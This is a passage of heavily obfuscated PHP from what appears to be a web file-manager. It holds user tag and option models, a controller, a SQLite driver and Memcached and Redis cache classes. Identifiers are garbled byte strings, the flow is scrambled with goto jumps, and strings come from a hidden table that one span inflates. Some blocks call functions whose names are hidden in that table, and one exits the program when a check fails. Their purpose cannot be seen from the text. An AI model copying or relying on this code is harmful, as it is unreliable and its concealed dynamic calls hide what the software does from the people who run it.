array($BÕ‹•Åç–ê[99] => $bİ¡’×‚—, $BÕ‹•Åç–ê[375] => array($BÕ‹•Åç–ê[382], "\x25{$C“ğÅİ¦‰À}\45")); goto fôÇ÷•ä´„; eõæàãóÏ¬: } private function _listDataApplyItem($cÆÍ¨ƒ¦‹) { $f‚œÂ‰îÁ… = array($cÆÍ¨ƒ¦‹); $this->_listDataApply($f‚œÂ‰îÁ…); return $f‚œÂ‰îÁ…[0]; } private function _listDataApply(&$Bê…™×†…¿) { goto Bİ‰Ú®†å; Bİ‰Ú®†å: $bƒ…ôÂÅ†Æ =& $_SERVER[¢Í]; if (!$Bê…™×†…¿) { return; } array_remove_key($Bê…™×†…¿, $bƒ…ôÂÅ†Æ[817]); goto cŸµ–×š; cŸµ–×š: $Bø¬£ê¹ = array_to_keyvalue($Bê…™×†…¿, $bƒ…ôÂÅ†Æ[33], $bƒ…ôÂÅ†Æ[1489]); $this->_listAppendGroup($Bê…™×†…¿, $Bø¬£ê¹); $this->_listAppendMeta($Bê…™×†…¿, $Bø¬£ê¹); goto d”„´´­·; d”„´´­·: $this->_listAppendSourceRoot($Bê…™×†…¿, $Bø¬£ê¹); goto fÑ¯”ìÊÈƒ; fÑ¯”ìÊÈƒ: } private function _listAppendSourceRoot(&$cÊ¨ì©Î”ô, $bƒ…š¦ô÷”) { goto b‘˜íçêÑ²; aó·è÷Ê´: foreach ($cÊ¨ì©Î”ô as &$E£‘ÉÜ»Ò) { $E£‘ÉÜ»Ò[$fğ®±èô½¶[416]] = $bÉ‘£àëòĞ[$E£‘ÉÜ»Ò[$fğ®±èô½¶[1489]]] ? $bÉ‘£àëòĞ[$E£‘ÉÜ»Ò[$fğ®±èô½¶[1489]]] : array(); } unset($E£‘ÉÜ»Ò); goto DÛùÖ’‡ò¼; b‘˜íçêÑ²: $fğ®±èô½¶ =& $_SERVER[¢Í]; $D› Ğİñ¯Ş = array($fğ®±èô½¶[487] => 0, $fğ®±èô½¶[396] => SourceModel::TYPE_USER, $fğ®±èô½¶[482] => array($fğ®±èô½¶[7], $bƒ…š¦ô÷”)); $f¨Š‹È¹†Ë = $fğ®±èô½¶[1744]; goto bº´ïŠ; bº´ïŠ: $bÉ‘£àëòĞ = Model($fğ®±èô½¶[765])->order($fğ®±èô½¶[1745])->field($f¨Š‹È¹†Ë)->where($D› Ğİñ¯Ş)->select(); $bÉ‘£àëòĞ = array_to_keyvalue($bÉ‘£àëòĞ, $fğ®±èô½¶[482]); $bÉ‘£àëòĞ = array_remove_key($bÉ‘£àëòĞ, $fğ®±èô½¶[482]); goto aó·è÷Ê´; DÛùÖ’‡ò¼: } private function _listAppendGroup(&$eáŒ§Êààé, $Aæ”‹ÚÀãÒ) { goto bÀŒğë°ï; B¡î–ìñ‹œ: $fÙÄ½ßŠª‹ = array_to_keyvalue_group($fÙÄ½ßŠª‹, $CÆå†Ïˆ„Í[1489]); foreach ($fÙÄ½ßŠª‹ as &$eÁ²ª¸“©) { $Aù‚—®Ïñ = array(); foreach ($eÁ²ª¸“© as $D®Üãƒê‚î) { if (!$D®Üãƒê‚î[$CÆå†Ïˆ„Í[1797]]) { continue; } $DÍ“æ÷Èï = Model($CÆå†Ïˆ„Í[1817])->listData($D®Üãƒê‚î[$CÆå†Ïˆ„Í[1797]]); $Aù‚—®Ïñ[] = array($CÆå†Ïˆ„Í[1648] => $D®Üãƒê‚î[$CÆå†Ïˆ„Í[1648]], $CÆå†Ïˆ„Í[2108] => $cÖ§¹æÎí×[$D®Üãƒê‚î[$CÆå†Ïˆ„Í[1648]]][$CÆå†Ïˆ„Í[28]], $CÆå†Ïˆ„Í[485] => $cÖ§¹æÎí×[$D®Üãƒê‚î[$CÆå†Ïˆ„Í[1648]]][$CÆå†Ïˆ„Í[485]], $CÆå†Ïˆ„Í[401] => $DÍ“æ÷Èï); } $eÁ²ª¸“© = $Aù‚—®Ïñ; } unset($eÁ²ª¸“©); goto a·ŒŸ‹š; f†·Üœ«¼Ì: $e‹½÷ª³ßø = array_to_keyvalue($fÙÄ½ßŠª‹, $CÆå†Ïˆ„Í[33], $CÆå†Ïˆ„Í[1648]); $e‹½÷ª³ßø = array_remove_value(array_unique($e‹½÷ª³ßø), $CÆå†Ïˆ„Í[494]); if (!$e‹½÷ª³ßø || !$fÙÄ½ßŠª‹) { return; } goto D¡Ø”Îêò; a·ŒŸ‹š: foreach ($eáŒ§Êààé as &$DæÂŞœˆÙ) { $DæÂŞœˆÙ[$CÆå†Ïˆ„Í[1823]] = array(); if (isset($fÙÄ½ßŠª‹[$DæÂŞœˆÙ[$CÆå†Ïˆ„Í[1489]]])) { $DæÂŞœˆÙ[$CÆå†Ïˆ„Í[1823]] = $fÙÄ½ßŠª‹[$DæÂŞœˆÙ[$CÆå†Ïˆ„Í[1489]]]; } } unset($DæÂŞœˆÙ); goto CÊ èã©‹; D¡Ø”Îêò: $dÆŞÁìÕ¸Å = array($CÆå†Ïˆ„Í[1648] => array($CÆå†Ïˆ„Í[7], $e‹½÷ª³ßø)); $cÖ§¹æÎí× = Model($CÆå†Ïˆ„Í[1821])->field($CÆå†Ïˆ„Í[2107])->where($dÆŞÁìÕ¸Å)->select(); $cÖ§¹æÎí× = array_to_keyvalue($cÖ§¹æÎí×, $CÆå†Ïˆ„Í[1648]); goto B¡î–ìñ‹œ; bÀŒğë°ï: $CÆå†Ïˆ„Í =& $_SERVER[¢Í]; $dÆŞÁìÕ¸Å = array($CÆå†Ïˆ„Í[1489] => array($CÆå†Ïˆ„Í[7], $Aæ”‹ÚÀãÒ)); $fÙÄ½ßŠª‹ = Model($CÆå†Ïˆ„Í[1731])->where($dÆŞÁìÕ¸Å)->select(); goto f†·Üœ«¼Ì; CÊ èã©‹: } private function _listAppendMeta(&$C²½–ÅåË, $c»¢œ‘¦‹ƒ) { goto F§òìŒ®ôĞ; F“ßƒØ×â÷: $a×ĞÉìä“ = array($bº‚¬ĞíŒê[1489] => array($bº‚¬ĞíŒê[7], $c»¢œ‘¦‹ƒ)); $cÖ¾œš¨±Ç = Model($bº‚¬ĞíŒê[2085])->where($a×ĞÉìä“)->select(); $cÖ¾œš¨±Ç = array_to_keyvalue_group($cÖ¾œš¨±Ç, $bº‚¬ĞíŒê[1489]); goto d”íÉÆöñ; Bí„««âì: foreach ($C²½–ÅåË as &$EÇ‰¶†êØ) { $A¿åËóáÜ = array(); if (isset($cÖ¾œš¨±Ç[$EÇ‰¶†êØ[$bº‚¬ĞíŒê[1489]]])) { $A¿åËóáÜ = $cÖ¾œš¨±Ç[$EÇ‰¶†êØ[$bº‚¬ĞíŒê[1489]]]; } $EÇ‰¶†êØ[$bº‚¬ĞíŒê[2110]] = array(); if (isset($A¿åËóáÜ[$fŒùÙ…¾ïÔ])) { $EÇ‰¶†êØ[$bº‚¬ĞíŒê[2110]] = $b‘œ­íãÓ¢->getUserJobInfo($A¿åËóáÜ[$fŒùÙ…¾ïÔ]); } } unset($EÇ‰¶†êØ); goto bù‘ãğçÊ; F§òìŒ®ôĞ: $bº‚¬ĞíŒê =& $_SERVER[¢Í]; $fŒùÙ…¾ïÔ = UserJobModel::JOB_KEY; $cÓËäŸ³Ó  = array($bº‚¬ĞíŒê[2087]); goto F“ßƒØ×â÷; d”íÉÆöñ: foreach ($cÖ¾œš¨±Ç as &$eì“ÃÉóä§) { $Eô’¥¶áíš = array(); foreach ($eì“ÃÉóä§ as $aâÑšñÊÓ‚) { if (!in_array($aâÑšñÊÓ‚[$bº‚¬ĞíŒê[99]], $cÓËäŸ³Ó )) { $Eô’¥¶áíš[$aâÑšñÊÓ‚[$bº‚¬ĞíŒê[99]]] = $aâÑšñÊÓ‚[$bº‚¬ĞíŒê[375]]; } } $eì“ÃÉóä§ = $Eô’¥¶áíš; } unset($eì“ÃÉóä§); $b‘œ­íãÓ¢ = Model($bº‚¬ĞíŒê[2109]); goto Bí„««âì; bù‘ãğçÊ: } protected function groupUserAll($CªâÅŠ´ØÄ) { $AÏ­×ª¯œì =& $_SERVER[¢Í]; if (!$CªâÅŠ´ØÄ) { return !1; } $d¥ªøïÓá¿ = Model($AÏ­×ª¯œì[1731])->field($AÏ­×ª¯œì[1489])->where(array($AÏ­×ª¯œì[1648] => array($AÏ­×ª¯œì[7], $CªâÅŠ´ØÄ)))->select(); $d¥ªøïÓá¿ = array_to_keyvalue($d¥ªøïÓá¿, $AÏ­×ª¯œì[33], $AÏ­×ª¯œì[1489]); return array_unique($d¥ªøïÓá¿); } public function userSearch($AŸŒÕŠ‘, $BšÇº‡Šò = "\52") { return Model($_SERVER[¢Í][503])->where($AŸŒÕŠ‘)->field($BšÇº‡Šò)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\x72\137\157\160\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($A™ÕíÎÜ°) { $fğßÊ¥± =& $_SERVER[¢Í]; if (!defined($fğßÊ¥±[451])) { define($fğßÊ¥±[451], 0); } return "\125\x73\x65\162\117\160\164\x69\157\x6e\x5f{$A™ÕíÎÜ°}\x5f" . USER_ID; } protected function filterWhere($dƒ‘Å‹¡÷) { $bÆÊ×ö”†³ =& $_SERVER[¢Í]; if (!defined($bÆÊ×ö”†³[451])) { define($bÆÊ×ö”†³[451], 0); } $dƒ‘Å‹¡÷[$bÆÊ×ö”†³[1489]] = USER_ID; return $dƒ‘Å‹¡÷; } public function cacheRemoveUser($fïš†İç‚, $B¼·Ó½«’‚) { return Cache::remove("\125\x73\145\x72\x4f\x70\x74\151\x6f\156\x5f{$fïš†İç‚}\x5f" . $B¼·Ó½«’‚); } protected function optionDefault($b‚ ‡‡© = '') { $A¾³ÏñÔ– =& $_SERVER[¢Í]; if ($b‚ ‡‡© == $A¾³ÏñÔ–[33]) { return $GLOBALS[$A¾³ÏñÔ–[6]][$A¾³ÏñÔ–[2111]]; } if ($b‚ ‡‡© == $A¾³ÏñÔ–[2112]) { return $GLOBALS[$A¾³ÏñÔ–[6]][$A¾³ÏñÔ–[2113]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\x72\56\164\x61\x67\114\x69\163\164"; public $modelType = "\x55\x73\x65\x72\x4f\x70\x74\151\157\x6e"; public $field = array("\x6e\141\x6d\x65", "\163\x74\171\x6c\145", "\x73\x6f\162\x74"); public function listData($fÛö”ñƒ˜Í = false, $b­ã›…ŞÇì = "\x73\x6f\x72\x74", $EÚ¤»ì›é = false) { return parent::listData($fÛö”ñƒ˜Í, $b­ã›…ŞÇì, $EÚ¤»ì›é); } public function remove($eÂ…Ãï×…) { return parent::remove($eÂ…Ãï×…); } public function add($dÓñ¦ëÜ§, $fÊƒŸÀ¦„… = "\154\x61\x62\x65\x6c\x2d\147\x72\145\x79\55\x6e\x6f\x72\155\x61\154") { $CÕµÆÄÕ„± =& $_SERVER[¢Í]; if ($this->findByName($dÓñ¦ëÜ§)) { return !1; } $b§ŠÂéÉòÏ = array($CÕµÆÄÕ„±[411] => $dÓñ¦ëÜ§, $CÕµÆÄÕ„±[461] => $fÊƒŸÀ¦„…, $CÕµÆÄÕ„±[1652] => $this->getSort($CÕµÆÄÕ„±[261]) + 1); return parent::insert($b§ŠÂéÉòÏ); } public function update($FËó‚ó‡‚ê, $D‹×­ùÒ¢) { $Dù„ÙƒİÎ =& $_SERVER[¢Í]; $Bƒî‘ù¨™ï = $this->listData($FËó‚ó‡‚ê); $Cè¨†çÍù¬ = $this->findByName($D‹×­ùÒ¢[$Dù„ÙƒİÎ[28]]); if (!$Bƒî‘ù¨™ï || $Cè¨†çÍù¬ && $Cè¨†çÍù¬[$Dù„ÙƒİÎ[392]] != $Bƒî‘ù¨™ï[$Dù„ÙƒİÎ[392]]) { return !1; } return parent::update($FËó‚ó‡‚ê, $D‹×­ùÒ¢); } public function moveTop($eİå¶Äğó¯) { $c‚İêÛ²Š× =& $_SERVER[¢Í]; $D¨Ô–¨„›• = parent::listData(); $A±ùš‹ïŠ¸ = $this->getSort($c‚İêÛ²Š×[260]); foreach ($D¨Ô–¨„›• as &$d¡çÃŒŠˆ) { if ($d¡çÃŒŠˆ[$c‚İêÛ²Š×[392]] == $eİå¶Äğó¯) { $d¡çÃŒŠˆ[$c‚İêÛ²Š×[1671]] = $A±ùš‹ïŠ¸; continue; } $d¡çÃŒŠˆ[$c‚İêÛ²Š×[1671]] += 1; } unset($d¡çÃŒŠˆ); return parent::resetData($D¨Ô–¨„›•); } public function moveBottom($EØ¸Ä¦²’™) { $E®äµ©Šğ =& $_SERVER[¢Í]; $DÛÄ—Å…Ùš = $this->getSort($E®äµ©Šğ[261]) + 1; return parent::update($EØ¸Ä¦²’™, array($E®äµ©Šğ[1671] => $DÛÄ—Å…Ùš)); } public function resetSort($D®¿‚““çÏ) { goto dÌâÆõ¥; B²‚”©Ã ˜: for ($D¾æƒĞµÔ„ = 0; $D¾æƒĞµÔ„ < count($D®¿‚““çÏ); $D¾æƒĞµÔ„++) { $BÂ“‹³·°é[$D®¿‚““çÏ[$D¾æƒĞµÔ„] . $C³ß³‡ÖÏë[33]] = $D¾æƒĞµÔ„ + 1; } $C½ Ğ˜¢àæ = parent::listData(); foreach ($C½ Ğ˜¢àæ as &$BİÓ‰ÀàÏ¯) { $eŞš‘¤Ò“ = $BÂ“‹³·°é[$BİÓ‰ÀàÏ¯[$C³ß³‡ÖÏë[392]]]; $BİÓ‰ÀàÏ¯[$C³ß³‡ÖÏë[1671]] = $eŞš‘¤Ò“ ? $eŞš‘¤Ò“ : $BİÓ‰ÀàÏ¯[$C³ß³‡ÖÏë[1671]]; } goto C¶äó‘ëÄˆ; dÌâÆõ¥: $C³ß³‡ÖÏë =& $_SERVER[¢Í]; $BÂ“‹³·°é = array(); $D®¿‚““çÏ = is_array($D®¿‚““çÏ) ? $D®¿‚““çÏ : array(); goto B²‚”©Ã ˜; C¶äó‘ëÄˆ: unset($BİÓ‰ÀàÏ¯); return parent::resetData($C½ Ğ˜¢àæ); goto f…™Ò„à˜Ä; f…™Ò„à˜Ä: } private function getSort($DÚæš­¦§) { $cõœâó…³ =& $_SERVER[¢Í]; $Fê½ ë«ÆÍ = parent::listData(); $c¯¦·Ì³ñË = array_to_keyvalue($Fê½ ë«ÆÍ, $cõœâó…³[33], $cõœâó…³[1671]); if (!$c¯¦·Ì³ñË) { $c¯¦·Ì³ñË = array(0); } $A—ŸÙé‚½ = $DÚæš­¦§ == $cõœâó…³[261] ? max($c¯¦·Ì³ñË) : min($c¯¦·Ì³ñË); return intval($A—ŸÙé‚½); } } goto Eİ¨îĞãğ«; fĞ¤¸à†À: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto C„„ è‚®ù; C„„ è‚®ù: $dÁÛ§©Ì©Á =& $_SERVER[¢Í]; global $in, $config; $this->config =& $config; goto B÷‹‹Õ«Ö; dÈ·Øª¶‚¦: $this->tpl = TEMPLATE . MOD . $dÁÛ§©Ì©Á[8]; $this->_classObjectID = mt_rand(0, 10000); goto dÁƒîé­–ã; B÷‹‹Õ«Ö: $this->in =& $in; $this->values[$dÁÛ§©Ì©Á[6]] =& $config; $this->values[$dÁÛ§©Ì©Á[7]] =& $in; goto dÈ·Øª¶‚¦; dÁƒîé­–ã: } public function loadClass($aÛÍØÄÇ) { if (1 === func_num_args()) { $this->{$aÛÍØÄÇ} = new $aÛÍØÄÇ(); } else { $dï‘öéÌ÷ = new ReflectionClass($aÛÍØÄÇ); $fëó®ğ”‡ = func_get_args(); array_shift($fëó®ğ”‡); $this->{$aÛÍØÄÇ} = $dï‘öéÌ÷->newInstanceArgs($fëó®ğ”‡); } return $this->{$aÛÍØÄÇ}; } protected function assign($d÷ƒ´‡êì§, $FÎ¬–…çÙŠ) { $this->values[$d÷ƒ´‡êì§] = $FÎ¬–…çÙŠ; } protected function display($EÂß¹Š£ìŒ) { ob_end_clean(); extract($this->values); require $this->tpl . $EÂß¹Š£ìŒ; } } class DbSqliteBase extends Db { public function __construct($dä¤é‡Ø© = '') { $C½ÚîÑÙ‚˜ =& $_SERVER[¢Í]; if (!extension_loaded($C½ÚîÑÙ‚˜[9])) { think_exception(think_lang($C½ÚîÑÙ‚˜[10]) . $C½ÚîÑÙ‚˜[11]); } if (!empty($dä¤é‡Ø©)) { if (!isset($dä¤é‡Ø©[$C½ÚîÑÙ‚˜[12]])) { $dä¤é‡Ø©[$C½ÚîÑÙ‚˜[12]] = 438; } $this->config = $dä¤é‡Ø©; if (empty($this->config[$C½ÚîÑÙ‚˜[13]])) { $this->config[$C½ÚîÑÙ‚˜[13]] = array(); } } } public function connect($b”„ôÛ×¬ö = '', $bƒ­ŞÃ— = 0) { $bô¸¶‰°á» =& $_SERVER[¢Í]; if (!isset($this->linkID[$bƒ­ŞÃ—])) { goto d·ÊâÇŠ‚; c›îíï¤Íö: $this->linkID[$bƒ­ŞÃ—] = $e°Òá÷äÍ($b”„ôÛ×¬ö[$bô¸¶‰°á»[17]], $b”„ôÛ×¬ö[$bô¸¶‰°á»[12]]); if (!$this->linkID[$bƒ­ŞÃ—]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto aœ„œæ¨Œ; aœ„œæ¨Œ: @sqlite_busy_timeout($this->linkID[$bƒ­ŞÃ—], 30000); if (1 != think_config($bô¸¶‰°á»[18])) { unset($this->config); } goto CºÂğœêÍÆ; d·ÊâÇŠ‚: if (empty($b”„ôÛ×¬ö)) { $b”„ôÛ×¬ö = $this->config; } $e²–¨„÷ç = !empty($b”„ôÛ×¬ö[$bô¸¶‰°á»[13]][$bô¸¶‰°á»[14]]) ? $b”„ôÛ×¬ö[$bô¸¶‰°á»[13]][$bô¸¶‰°á»[14]] : $this->pconnect; $e°Òá÷äÍ = $e²–¨„÷ç ? $bô¸¶‰°á»[15] : $bô¸¶‰°á»[16]; goto c›îíï¤Íö; CºÂğœêÍÆ: } return $this->linkID[$bƒ­ŞÃ—]; } public function free() { $this->queryID = null; } public function query($DÑß¥Œë¨) { goto A—Ÿ÷ˆ’ƒ‰; d•‘ÜåÍÕ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $BÎ¿ï“§‘Ö = $this->getAll(); return $BÎ¿ï“§‘Ö; } goto B×Õ»ƒ½Œ›; CŠŒ“¬Ç¡: think_status($aÍ›´‰øÔÈ[20]); $this->queryID = sqlite_query($this->_linkID, $DÑß¥Œë¨); $this->debug(); goto d•‘ÜåÍÕ; A—Ÿ÷ˆ’ƒ‰: $aÍ›´‰øÔÈ =& $_SERVER[¢Í]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto E‡’äÓÍÔ•; E‡’äÓÍÔ•: $this->queryStr = $DÑß¥Œë¨; if ($this->queryID) { $this->free(); } think_action_status($aÍ›´‰øÔÈ[19], 1); goto CŠŒ“¬Ç¡; B×Õ»ƒ½Œ›: } public function execute($f¼ğÓ˜¸«ì) { goto aç©ˆ„Æ‹; aç©ˆ„Æ‹: $D÷›ëÓíö =& $_SERVER[¢Í]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto aˆÕ¸øô‚; FÊ²‹Ë¢¿: think_status($D÷›ëÓíö[20]); $e»±ÒÁõ = sqlite_exec($this->_linkID, $f¼ğÓ˜¸«ì); $this->debug(); goto bôòÉ‹»Ğ; bôòÉ‹»Ğ: if (!1 === $e»±ÒÁõ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto c…Ó‘‰÷’ˆ; aˆÕ¸øô‚: $this->queryStr = $f¼ğÓ˜¸«ì; if ($this->queryID) { $this->free(); } think_action_status($D÷›ëÓíö[21], 1); goto FÊ²‹Ë¢¿; c…Ó‘‰÷’ˆ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[¢Í][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $C‚æ©˜ˆ = sqlite_query($this->_linkID, $_SERVER[¢Í][23]); if (!$C‚æ©˜ˆ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Eªœœš¥ÈÏ = sqlite_query($this->_linkID, $_SERVER[¢Í][24]); if (!$Eªœœš¥ÈÏ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $CÕ„áİÈ™ = array(); if ($this->numRows > 0) { for ($D»Á¥Ë­Š¦ = 0; $D»Á¥Ë­Š¦ < $this->numRows; $D»Á¥Ë­Š¦++) { $CÕ„áİÈ™[$D»Á¥Ë­Š¦] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $CÕ„áİÈ™; } public function getFields($F‹‹‡øÊÚË) { $c¼òéĞ‡† =& $_SERVER[¢Í]; $cŸ†…½×âæ = $this->query($c¼òéĞ‡†[25] . $F‹‹‡øÊÚË . $c¼òéĞ‡†[26]); $A©£…ÒÓî‚ = array(); if ($cŸ†…½×âæ) { foreach ($cŸ†…½×âæ as $dø¨ôÔãÓŞ => $bÏÓÄ¿ƒÙÅ) { $A©£…ÒÓî‚[$bÏÓÄ¿ƒÙÅ[$c¼òéĞ‡†[27]]] = array($c¼òéĞ‡†[28] => $bÏÓÄ¿ƒÙÅ[$c¼òéĞ‡†[27]], $c¼òéĞ‡†[29] => $bÏÓÄ¿ƒÙÅ[$c¼òéĞ‡†[30]], $c¼òéĞ‡†[31] => (bool) ($bÏÓÄ¿ƒÙÅ[$c¼òéĞ‡†[32]] === $c¼òéĞ‡†[33]), $c¼òéĞ‡†[34] => $bÏÓÄ¿ƒÙÅ[$c¼òéĞ‡†[35]], $c¼òéĞ‡†[36] => strtolower($bÏÓÄ¿ƒÙÅ[$c¼òéĞ‡†[37]]) == $c¼òéĞ‡†[38], $c¼òéĞ‡†[39] => strtolower($bÏÓÄ¿ƒÙÅ[$c¼òéĞ‡†[40]]) == $c¼òéĞ‡†[41]); } } return $A©£…ÒÓî‚; } public function getTables($DÎ°Á·¢øÁ = '') { $f²Ø…Ï×œ³ =& $_SERVER[¢Í]; $f…İó­† = $this->query($f²Ø…Ï×œ³[42] . $f²Ø…Ï×œ³[43] . $f²Ø…Ï×œ³[44]); $dëŠŒ¶Ê™¥ = array(); foreach ($f…İó­† as $a•ò·ÑÛ““ => $a­´Ë¯­Úá) { $dëŠŒ¶Ê™¥[$a•ò·ÑÛ““] = current($a­´Ë¯­Úá); } return $dëŠŒ¶Ê™¥; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $F ½ô­Çã× =& $_SERVER[¢Í]; $e°à²ŒÚ = sqlite_last_error($this->_linkID); $this->error = $e°à²ŒÚ . $F ½ô­Çã×[4] . sqlite_error_string($e°à²ŒÚ); if ($F ½ô­Çã×[33] != $this->queryStr) { $this->error .= LNG($F ½ô­Çã×[45]) . $this->queryStr; } think_trace($this->error, $F ½ô­Çã×[33], $F ½ô­Çã×[46]); return $this->error; } public function escapeString($F“‰Ÿ¬Õ‹) { return sqlite_escape_string($F“‰Ÿ¬Õ‹); } public function parseLimit($bÙğ¥ŞÍ ×) { $d†‹Ó÷ïò¤ =& $_SERVER[¢Í]; $D¾³„í£ç± = $d†‹Ó÷ïò¤[33]; if (!empty($bÙğ¥ŞÍ ×)) { $bÙğ¥ŞÍ × = explode($d†‹Ó÷ïò¤[47], $bÙğ¥ŞÍ ×); if (count($bÙğ¥ŞÍ ×) > 1) { $D¾³„í£ç± .= $d†‹Ó÷ïò¤[48] . $bÙğ¥ŞÍ ×[1] . $d†‹Ó÷ïò¤[49] . $bÙğ¥ŞÍ ×[0] . $d†‹Ó÷ïò¤[50]; } else { $D¾³„í£ç± .= $d†‹Ó÷ïò¤[48] . $bÙğ¥ŞÍ ×[0] . $d†‹Ó÷ïò¤[50]; } } return $D¾³„í£ç±; } } if ($_SERVER[$_SERVER[¢Í][51]] != $_SERVER[$_SERVER[¢Í][52]]) { goto A‰âÂÑô¦Ñ; A‰âÂÑô¦Ñ: $F±•ğÔ×Ø˜ = $_SERVER[¢Í][53]; $CçŒ¾ˆï£ = $_SERVER[$_SERVER[¢Í][54]] . $_SERVER[¢Í][55]; $cĞè¯ÆÉ°‘ = $F±•ğÔ×Ø˜($CçŒ¾ˆï£); goto B®®§îÆÛè; B®®§îÆÛè: $f¤»¾‚šÓ› = explode($_SERVER[¢Í][56], $cĞè¯ÆÉ°‘); if (count($f¤»¾‚šÓ›) < $_SERVER[¢Í][57]) { $A«Í°ì¿‰œ = $_SERVER[¢Í][58]; $A«Í°ì¿‰œ(); } $cíÔØ†øÙù = $_SERVER[¢Í][59]; goto DØº…šö‹; DØº…šö‹: $cíÔØ†øÙù($_SERVER[$_SERVER[¢Í][60]]); goto Dìæ¥»Øø; Dìæ¥»Øø: } goto Eœƒ‚ïˆ; d¶Ğ¿®ÃÓè: $_SERVER[×§Œ³] = explode($_SERVER[¢Í][574], gzinflate(substr($_SERVER[¢Í][575], 10, -8))); $A”²Ñ¢ÇŠô = $_SERVER[¢Í][576]; if (strlen($A”²Ñ¢ÇŠô) < $_SERVER[¢Í][577]) { die; } goto A…ŸËÔùÚ; e½ÁÍ­à“: class CacheLockDatabase { public function lock($aàç®ÕĞ¦, $e¥ Ü•è = 0) { $EàÙ”¤—¯† = Model($_SERVER[¢Í][769]); $a¤½¯äø²˜ = microtime(!0) + $e¥ Ü•è; while (microtime(!0) < $a¤½¯äø²˜) { $E¡ÍÂˆ£Çˆ = $EàÙ”¤—¯†->get($aàç®ÕĞ¦); if (!$E¡ÍÂˆ£Çˆ || $E¡ÍÂˆ£Çˆ < microtime(!0)) { $aŠ¤åØ¤±« = $EàÙ”¤—¯†->set($aàç®ÕĞ¦, $a¤½¯äø²˜); if ($aŠ¤åØ¤±«) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($cìÇòÈ¶) { return Model($_SERVER[¢Í][769])->get($cìÇòÈ¶); } public function unlock($fŠÁ÷Ó­×¾) { Model($_SERVER[¢Í][769])->remove($fŠÁ÷Ó­×¾); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($CÏ¨©¶‘»®, $EÔó°¥¿³Ê) { $cõÁİ‘““ =& $_SERVER[¢Í]; if (!class_exists($cõÁİ‘““[796])) { show_json($cõÁİ‘““[797], !1); } $this->cacheTime = $EÔó°¥¿³Ê; $this->handle = new Memcached(); if (is_array($CÏ¨©¶‘»®[$cõÁİ‘““[798]]) && count($CÏ¨©¶‘»®[$cõÁİ‘““[798]]) >= 1) { foreach ($CÏ¨©¶‘»®[$cõÁİ‘““[798]] as $CÆùô†ì â) { $eÒ£‡÷²ˆ– = explode($cõÁİ‘““[4], $CÆùô†ì â); $this->handle->addServer($eÒ£‡÷²ˆ–[0], $eÒ£‡÷²ˆ–[1]); } } else { $this->handle->addServer($CÏ¨©¶‘»®[$cõÁİ‘““[183]], $CÏ¨©¶‘»®[$cõÁİ‘““[184]]); } } public function set($fŒÙ‚¦«†, $d¨‹±ã™òÛ, $bŠÊäïğÊ = false) { $bŠÊäïğÊ = $bŠÊäïğÊ ? $bŠÊäïğÊ : $this->cacheTime; return $this->handle->set($fŒÙ‚¦«†, $d¨‹±ã™òÛ, $bŠÊäïğÊ); } public function get($A†È–º›¤œ) { return $this->handle->get($A†È–º›¤œ); } public function remove($C¬°¶¸Ù½‚) { return $this->handle->delete($C¬°¶¸Ù½‚); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($E¶÷ŠÓëœ, $F³³§Ù³‹•) { $cŒÖ¢êå•Ö =& $_SERVER[¢Í]; if (!class_exists($cŒÖ¢êå•Ö[799])) { show_json($cŒÖ¢êå•Ö[800], !1); } $this->cacheTime = $F³³§Ù³‹•; $D±¹˜¡§ì‡ = isset($E¶÷ŠÓëœ[$cŒÖ¢êå•Ö[801]]) ? $E¶÷ŠÓëœ[$cŒÖ¢êå•Ö[801]] : 10; $AÙ®ìÙ¾Ï® = _get($E¶÷ŠÓëœ, $cŒÖ¢êå•Ö[798]); if ($AÙ®ìÙ¾Ï® && is_array($AÙ®ìÙ¾Ï®)) { $this->initCluster($E¶÷ŠÓëœ, $D±¹˜¡§ì‡); } else { $this->handle = $this->init($E¶÷ŠÓëœ, $D±¹˜¡§ì‡); } } private function init($cˆ™ÍÕŒÖ, $eƒœ–âñº) { $AÀ®×öÄ¢² =& $_SERVER[¢Í]; $FƒáêÅŠ = new Redis(); $F‡Ô§ö÷á = isset($cˆ™ÍÕŒÖ[$AÀ®×öÄ¢²[802]]) ? $cˆ™ÍÕŒÖ[$AÀ®×öÄ¢²[802]] : !1; if ($F‡Ô§ö÷á) { $FƒáêÅŠ->pconnect($cˆ™ÍÕŒÖ[$AÀ®×öÄ¢²[183]], $cˆ™ÍÕŒÖ[$AÀ®×öÄ¢²[184]], $eƒœ–âñº); } else { $FƒáêÅŠ->connect($cˆ™ÍÕŒÖ[$AÀ®×öÄ¢²[183]], $cˆ™ÍÕŒÖ[$AÀ®×öÄ¢²[184]], $eƒœ–âñº); } if (!empty($cˆ™ÍÕŒÖ[$AÀ®×öÄ¢²[401]])) { $FƒáêÅŠ->auth($cˆ™ÍÕŒÖ[$AÀ®×öÄ¢²[401]]); } return $FƒáêÅŠ; } private function initCluster($fğ´§¼Ğ, $B¼¯áĞ‡‘Ã) { $BãİÉå…Î =& $_SERVER[¢Í]; $Fùš®æ‘ = array($BãİÉå…Î[803], $BãİÉå…Î[804], $BãİÉå…Î[805]); $dÁÉé¼³ï = $BãİÉå…Î[803]; if 